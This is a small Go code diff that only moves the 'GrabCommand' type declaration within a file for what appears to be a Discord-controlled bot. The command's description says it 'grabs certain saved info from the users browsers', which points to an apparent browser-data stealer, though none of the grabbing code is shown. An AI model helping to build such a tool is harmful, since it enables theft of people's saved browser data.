@@ -17,8 +17,6 @@ const (
 	endStr string = "\x1b[0m\n"
 )
 
-type GrabCommand struct{}
-
 func (*GrabCommand) Run(s *discordgo.Session, m *discordgo.MessageCreate, args []string) error {
 	if len(args) == 0 {
 		_, err := s.ChannelMessageSendReply(m.ChannelID, gravArgsError+"\nUsage: "+grabUsage, m.Reference())
@@ -74,3 +72,5 @@ func (*GrabCommand) Name() string {
 func (*GrabCommand) Info() string {
 	return "grabs certain saved info from the users browsers"
 }
+
+type GrabCommand struct{}
